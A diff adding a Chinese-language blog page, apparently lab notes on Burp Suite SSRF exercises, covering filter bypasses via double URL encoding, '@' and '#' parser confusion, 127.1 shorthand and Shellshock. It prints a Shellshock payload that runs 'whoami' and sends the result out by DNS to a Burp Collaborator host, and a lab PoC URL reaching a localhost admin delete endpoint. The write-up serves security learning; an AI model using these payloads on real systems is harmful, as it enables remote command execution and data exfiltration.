@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="burplab_ssrfreferer绕过可以在referer中加个dns查询 双重url加密绕过如果存在类似url_decode()的函数就可以了 特殊符号1127.0.0.1 --&gt; 127.1  省略前导零： 127.0.0.1  中的每个部分（127, 0, 0, 1）都可以省略前导零。因此， 127.0.0.1  可以简化为  127.0.1  或进一步简化为  127.1  解析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="burplab_ssrf">
+<meta property="og:url" content="https://aaaaaamua.github.io/2025/03/13/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/burpsuite_lab/ssrf/index.html">
+<meta property="og:site_name" content="aaaaaaamua">
+<meta property="og:description" content="burplab_ssrfreferer绕过可以在referer中加个dns查询 双重url加密绕过如果存在类似url_decode()的函数就可以了 特殊符号1127.0.0.1 --&gt; 127.1  省略前导零： 127.0.0.1  中的每个部分（127, 0, 0, 1）都可以省略前导零。因此， 127.0.0.1  可以简化为  127.0.1  或进一步简化为  127.1  解析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aaaaaamua.github.io/img/404.jpg">
+<meta property="article:published_time" content="2025-03-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-03T02:31:38.250Z">
+<meta property="article:author" content="aaaaaaamua">
+<meta property="article:tag" content="ssrf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aaaaaamua.github.io/img/404.jpg">
+
+
+<title >burplab_ssrf</title>
+
+<!-- Favicon -->
+
+    <link href='http://mms2.baidu.com/it/u=1764489770,1790526983&fm=253&app=138&f=JPEG?w=508&h=500?v=2.2.5' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304?v=2.2.5' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304?v=2.2.5' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"aaaaaamua.github.io","author":"aaaaaaamua","root":"/","typed_text":["cow and horse"],"theme_version":"2.2.5","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"/img/picture/touxiang.png","icon16":"http://mms2.baidu.com/it/u=1764489770,1790526983&fm=253&app=138&f=JPEG?w=508&h=500","icon32":"http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304","apple_touch_icon":null,"webmanifest":null,"visibilitychange":false,"hidden":"https://mms2.baidu.com/it/u=251319153,2346383010&fm=253&app=120&f=JPEGw=500&h=500# /failure.ico","show_text":"(/≧▽≦/)咦！又好了！","hide_text":"(●—●)喔哟，崩溃啦！","appleTouchIcon":"http://mms0.baidu.com/it/u=4208939750,346890809&fm=253&app=138&f=JPEG?w=304&h=304"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":false,"title":"default","height_limit":200},"toc":{"post_title":false},"live_time":{"start_time":"","prefix":"博客已萌萌哒运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"trigger":"auto","path":"search.json"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-05-03 10:31:38"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.5" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+
+    
+        <!-- Baidu Analytics -->
+        <script defer>
+            var _hmt = _hmt || [];
+            (function() {
+              var hm = document.createElement("script");
+              hm.src = "https://hm.baidu.com/hm.js?20136";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+            })();
+        </script>
+     
+
+    
+        <!-- Google Analytics -->
+        <script async src='https://www.googletagmanager.com/gtag/js?id=G-EJ6W34RGXT'></script>
+        <script defer>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-EJ6W34RGXT');
+        </script>
+    
+
+    
+ 
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/img/picture/touxiang.png">
+    
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/tags" target="">
+                    标签
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/links/" target="">
+                    友链
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/img/banner.png">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-12">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text trm-text-center ">
+                        <div class="trm-label trm-mb-20">
+                            Hi my new friend!
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            burplab_ssrf
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2025
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+            <div class="trm-page-content col-lg-12">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            03/13
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            00:00
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            aaaaaaamua
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h1 id="burplab-ssrf"><a href="#burplab-ssrf" class="headerlink" title="burplab_ssrf"></a>burplab_ssrf</h1><h2 id="referer绕过"><a href="#referer绕过" class="headerlink" title="referer绕过"></a>referer绕过</h2><p>可以在referer中加个dns查询</p>
+<h2 id="双重url加密绕过"><a href="#双重url加密绕过" class="headerlink" title="双重url加密绕过"></a>双重url加密绕过</h2><p>如果存在类似<code>url_decode()</code>的函数就可以了</p>
+<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 --&gt; 127.1</span><br></pre></td></tr></table></figure>
+
+<p>省略前导零：<br> 127.0.0.1  中的每个部分（127, 0, 0, 1）都可以省略前导零。因此， 127.0.0.1  可以简化为  127.0.1  或进一步简化为  127.1 </p>
+<p>解析器处理：<br>大多数网络解析器（如操作系统的网络堆栈、Web 服务器等）在处理地址时，会自动补全省略的前导零。因此，当接收到  127.1  时，解析器会将其解释为</p>
+<h2 id="通过可以跳转的功能点找到可能跳转路径的parameter"><a href="#通过可以跳转的功能点找到可能跳转路径的parameter" class="headerlink" title="通过可以跳转的功能点找到可能跳转路径的parameter"></a>通过可以跳转的功能点找到可能跳转路径的parameter</h2><p>找到可以跳转的元素之后,最好是放到支持POST的功能页面里面来执行</p>
+<blockquote>
+<p>GET找到parameter , 放到POST里面</p>
+</blockquote>
+<h2 id="shellshock漏洞"><a href="#shellshock漏洞" class="headerlink" title="shellshock漏洞"></a><code>shellshock</code>漏洞</h2><blockquote>
+<p>太鸡把强了<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/120624292#:~:text=%E6%9C%AC%E6%96%87%E4%BB%8B%E7%BB%8D%E4%BA%86%E4%BB%80%E4%B9%88%E6%98%AF%E7%9B%B2SSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%E5%92%8C%E5%88%A9%E7%94%A8%E7%9B%B2SSRF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E5%8F%8ACollaborator">SSRF盲打 &amp; Collaborator everywhere-CSDN博客</a></p>
+</blockquote>
+<h3 id="使用Collaborator-Everywhere自动挖洞"><a href="#使用Collaborator-Everywhere自动挖洞" class="headerlink" title="使用Collaborator Everywhere自动挖洞"></a><strong>使用<code>Collaborator Everywhere</code>自动挖洞</strong></h3><p>burp插件</p>
+<p>安装完之后在<code>target</code>中发现对应的url，发送到<code>Add to Scope</code>在<code>scope</code>中勾选<code>url</code>就会开始挖洞,结果在<code>target</code>页面的<code>issue</code>中</p>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>bash版本小于4.3</p>
+<p>可以使用<code>shellshock</code>漏洞</p>
+<p>原理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# export name = &#x27;() &#123;echo &quot;Ling&quot;;&#125;&#x27;</span><br><span class="line">root@ubuntu:/# name</span><br><span class="line">bash: name: commond not found</span><br><span class="line"></span><br><span class="line">root@ubuntu:/# bash</span><br><span class="line">bash~4.3# name</span><br><span class="line">bash~4.3# Ling</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在 Bash 中一种独有的方法来定义函数 , 即 : 通过环境变量来定义函数</p>
+<p>当某个环境变量的值以字符串 “ () { “ 的格式作为开头, 那么该变量就会被当前 Bash 当作一个导出函数, 该函数仅会在当前 Bash 的子进程中生效 .</p>
+<p>导致漏洞出问题是以(){开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令</p>
+</blockquote>
+<h3 id="HTTP中UA头一般保存在环境变量中"><a href="#HTTP中UA头一般保存在环境变量中" class="headerlink" title="HTTP中UA头一般保存在环境变量中"></a>HTTP中UA头一般保存在环境变量中</h3><p>POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; /usr/bin/nslookup `whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>HTTP协议的头User-Agent通常是保存在环境变量<code>HTTP_USER_AGENT</code>的</p>
+<p>shellshock的payload：() { :; }; &#x2F;usr&#x2F;bin&#x2F;nslookup <code>whoami</code>.YOUR-SUBDOMAIN-HERE.burpcollaborator.net</p>
+<p>YOUR-SUBDOMAIN-HERE就是刚才Burp Collaborator client生成的域名，该payload可以将whoami的信息带外出来</p>
+</blockquote>
+<h3 id="反扒措施检测referer头"><a href="#反扒措施检测referer头" class="headerlink" title="反扒措施检测referer头"></a>反扒措施检测referer头</h3><h4 id="Referer头被探测的原因"><a href="#Referer头被探测的原因" class="headerlink" title="Referer头被探测的原因"></a><code>Referer</code>头被探测的原因</h4><ul>
+<li><strong>服务器对请求来源的验证与跟踪需求</strong>：服务器通常会检查<code>Referer</code>头来验证请求的来源是否合法，比如防止恶意请求从非授权的页面发起。同时，服务器端分析软件会根据<code>Referer</code>来统计页面的访问来源，了解用户是从哪些页面链接过来的，以便分析用户行为和网站流量路径。如果服务器在处理<code>Referer</code>头时存在漏洞，没有对其内容进行严格的过滤和验证，就可能导致它去访问<code>Referer</code>中指定的任意网址，包括内网地址，从而引发 SSRF 漏洞。</li>
+</ul>
+<h4 id="携带User-Agent等信息的原因"><a href="#携带User-Agent等信息的原因" class="headerlink" title="携带User - Agent等信息的原因"></a>携带<code>User - Agent</code>等信息的原因</h4><ul>
+<li><strong>模拟正常请求行为</strong>：服务器在处理请求时，会将<code>User - Agent</code>等请求头信息作为请求的一部分来处理，以了解客户端的类型、操作系统、浏览器等信息，这有助于服务器根据不同的客户端情况返回合适的响应内容。当服务器访问<code>Referer</code>中的网址时，为了模拟正常的请求流程，通常会将原请求中的<code>User - Agent</code>等信息一并带上，就好像是客户端直接访问<code>Referer</code>中的网址一样。这样，被访问的目标网址（如果是存在漏洞的情况下）就可以根据这些信息来进一步处理请求，攻击者也可以利用这些信息来进行更精准的攻击或信息收集。</li>
+</ul>
+<h4 id="服务器端分析软件不一定会转发整个-HTTP-请求包到Referer"><a href="#服务器端分析软件不一定会转发整个-HTTP-请求包到Referer" class="headerlink" title="服务器端分析软件不一定会转发整个 HTTP 请求包到Referer"></a>服务器端分析软件不一定会转发整个 HTTP 请求包到<code>Referer</code></h4><ul>
+<li><strong>取决于服务器端的具体实现和漏洞情况</strong>：一般来说，服务器端分析软件可能只是提取<code>Referer</code>头中的网址，并尝试访问该网址以获取相关信息，不一定会完整地转发整个 HTTP 请求包。</li>
+</ul>
+<h2 id="分析url语法分析器屏蔽的是什么东西"><a href="#分析url语法分析器屏蔽的是什么东西" class="headerlink" title="分析url语法分析器屏蔽的是什么东西"></a>分析url语法分析器屏蔽的是什么东西</h2><h3 id="过waf的思路"><a href="#过waf的思路" class="headerlink" title="过waf的思路"></a>过waf的思路</h3><ul>
+<li><p>逐个删除，发现一定需要保留可以被解析出来的url<code>stock.weliketoshop.net</code></p>
+</li>
+<li><p>url叠上加密,层层叠加,发现只能识别一层url,两层就无法识别了</p>
+</li>
+<li><p>使用<code>#</code>来注释,url编码两次就能绕过,<code>#</code>经过两次url编码变成<code>%2523</code></p>
+</li>
+<li><p>路径后携带<code>@</code>可以被识别成重定向成@后面的,但是后端代码使用的库可能没有解析多层url的能力</p>
+</li>
+<li><p>可以使用<code>%2523@stock.weliketoshop.net</code>来骗词法分析器以为定向到的就是目标url</p>
+</li>
+<li><p><code>www.baidu.com@www.bing.com</code>定向到<code>www.bing.com</code></p>
+</li>
+<li><p><code>www.baidu.com#@www.bing.com</code>后面被注释,定向到<code>www.baidu.com</code></p>
+</li>
+<li><p><code>www.baidu.com@www.bing.com/admin</code>访问的是<code>www.bing.com/admin</code></p>
+</li>
+<li><p><code>www.baidu.com#@www.bing.com/admin</code>访问的是<code>www.baidu.com/admin</code></p>
+<p><img src="/2025/05/02/hello-world/te_lab/ssrf/image-20250314155431846.png" alt="image-20250314155431846"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+</li>
+</ul>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过waf的其他思路文章"><a href="#绕过waf的其他思路文章" class="headerlink" title="绕过waf的其他思路文章"></a>绕过waf的其他思路文章</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321535.html">关于SSRF和多种绕过方式 - FreeBuf网络安全行业门户</a></p>
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2025/03/16/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/burpsuite_lab/http_requests_smuglling/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/block.jpg">
+                </span>
+                <h6 class="trm-op-title">burpsuitlab_http走私</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/03/16</li>
+                <li>00:00</li>
+                <li>打靶日记</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-older-publications-card trm-scroll-animation trm-active-el">
+        <div class="trm-older-publication">
+            
+            <a class="trm-op-top trm-anima-link" href="/2025/03/13/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/pikachu/ssrf/">
+                <span class="trm-op-cover">
+                    <img alt="cover" class="no-fancybox" src="/img/block.jpg">
+                </span>
+                <h6 class="trm-op-title">pikachu_ssrf</h6>
+            </a>
+            <div class="trm-divider trm-mb-15 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/03/13</li>
+                <li>00:00</li>
+                <li>打靶日记</li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024 - 2025</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">aaaaaaaaamua</span>
+        </div>
+    
+
+      
+
+     
+
+    
+        <div class="trm-footer-item">
+            大佬来了就随便看看吧
+        </div>
+     
+
+
+    
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        目录导航
+				<span id="post-toc-top">
+					置顶
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-1" title="burplab_ssrf"><a rel="nofollow" class="trm-toc-link" href="#burplab-ssrf"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">burplab_ssrf</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title="referer绕过"><a rel="nofollow" class="trm-toc-link" href="#referer绕过"><span class="trm-toc-number">1.1.</span> <span class="trm-toc-text">referer绕过</span></a></li><li class="trm-toc-item trm-toc-level-2" title="双重url加密绕过"><a rel="nofollow" class="trm-toc-link" href="#双重url加密绕过"><span class="trm-toc-number">1.2.</span> <span class="trm-toc-text">双重url加密绕过</span></a></li><li class="trm-toc-item trm-toc-level-2" title="特殊符号"><a rel="nofollow" class="trm-toc-link" href="#特殊符号"><span class="trm-toc-number">1.3.</span> <span class="trm-toc-text">特殊符号</span></a></li><li class="trm-toc-item trm-toc-level-2" title="通过可以跳转的功能点找到可能跳转路径的parameter"><a rel="nofollow" class="trm-toc-link" href="#通过可以跳转的功能点找到可能跳转路径的parameter"><span class="trm-toc-number">1.4.</span> <span class="trm-toc-text">通过可以跳转的功能点找到可能跳转路径的parameter</span></a></li><li class="trm-toc-item trm-toc-level-2" title="shellshock漏洞"><a rel="nofollow" class="trm-toc-link" href="#shellshock漏洞"><span class="trm-toc-number">1.5.</span> <span class="trm-toc-text">shellshock漏洞</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="使用Collaborator Everywhere自动挖洞"><a rel="nofollow" class="trm-toc-link" href="#使用Collaborator-Everywhere自动挖洞"><span class="trm-toc-number">1.5.1.</span> <span class="trm-toc-text">使用Collaborator Everywhere自动挖洞</span></a></li><li class="trm-toc-item trm-toc-level-3" title="漏洞"><a rel="nofollow" class="trm-toc-link" href="#漏洞"><span class="trm-toc-number">1.5.2.</span> <span class="trm-toc-text">漏洞</span></a></li><li class="trm-toc-item trm-toc-level-3" title="HTTP中UA头一般保存在环境变量中"><a rel="nofollow" class="trm-toc-link" href="#HTTP中UA头一般保存在环境变量中"><span class="trm-toc-number">1.5.3.</span> <span class="trm-toc-text">HTTP中UA头一般保存在环境变量中</span></a></li><li class="trm-toc-item trm-toc-level-3" title="反扒措施检测referer头"><a rel="nofollow" class="trm-toc-link" href="#反扒措施检测referer头"><span class="trm-toc-number">1.5.4.</span> <span class="trm-toc-text">反扒措施检测referer头</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-4" title="Referer头被探测的原因"><a rel="nofollow" class="trm-toc-link" href="#Referer头被探测的原因"><span class="trm-toc-number">1.5.4.1.</span> <span class="trm-toc-text">Referer头被探测的原因</span></a></li><li class="trm-toc-item trm-toc-level-4" title="携带User - Agent等信息的原因"><a rel="nofollow" class="trm-toc-link" href="#携带User-Agent等信息的原因"><span class="trm-toc-number">1.5.4.2.</span> <span class="trm-toc-text">携带User - Agent等信息的原因</span></a></li><li class="trm-toc-item trm-toc-level-4" title="服务器端分析软件不一定会转发整个 HTTP 请求包到Referer"><a rel="nofollow" class="trm-toc-link" href="#服务器端分析软件不一定会转发整个-HTTP-请求包到Referer"><span class="trm-toc-number">1.5.4.3.</span> <span class="trm-toc-text">服务器端分析软件不一定会转发整个 HTTP 请求包到Referer</span></a></li></ol></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="分析url语法分析器屏蔽的是什么东西"><a rel="nofollow" class="trm-toc-link" href="#分析url语法分析器屏蔽的是什么东西"><span class="trm-toc-number">1.6.</span> <span class="trm-toc-text">分析url语法分析器屏蔽的是什么东西</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="过waf的思路"><a rel="nofollow" class="trm-toc-link" href="#过waf的思路"><span class="trm-toc-number">1.6.1.</span> <span class="trm-toc-text">过waf的思路</span></a></li><li class="trm-toc-item trm-toc-level-3" title="POC"><a rel="nofollow" class="trm-toc-link" href="#POC"><span class="trm-toc-number">1.6.2.</span> <span class="trm-toc-text">POC</span></a></li><li class="trm-toc-item trm-toc-level-3" title="绕过waf的其他思路文章"><a rel="nofollow" class="trm-toc-link" href="#绕过waf的其他思路文章"><span class="trm-toc-number">1.6.3.</span> <span class="trm-toc-text">绕过waf的其他思路文章</span></a></li></ol></li></ol></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="目录">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+    <div class="trm-search-popup">
+        <div class="trm-search-wrapper">
+            <div class="form trm-search-form">
+                <div class="trm-search-input-icon">
+                    <i class="iconfont fas fa-search"></i>
+                </div>
+                <input class="trm-search-input" type="text" placeholder="搜索文章...">
+                <div class="trm-search-btn-close">
+                    <i class="iconfont fas fa-times"></i>
+                </div>
+            </div>
+            <div class="trm-search-result-container">
+                <div class="trm-search-empty">
+                    请输入关键词进行搜索
+                </div>
+            </div>
+            <div class="trm-search-footer">
+                <div class="trm-search-stats"></div>
+                <ul class="trm-search-commands">
+                    <li>
+                        <kbd class="command-palette-commands-key">
+                            <svg width="15" height="15" aria-label="Escape key" role="img">
+                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                                    stroke-width="1.2">
+                                    <path
+                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
+                                    </path>
+                                </g>
+                            </svg>
+                        </kbd>
+                        <span class="command-palette-Label">to close</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.2.5"></script>
+    
+
+    
+        
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+
+        <script src="/js/plugins/local_search.js?v=2.2.5"></script>
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
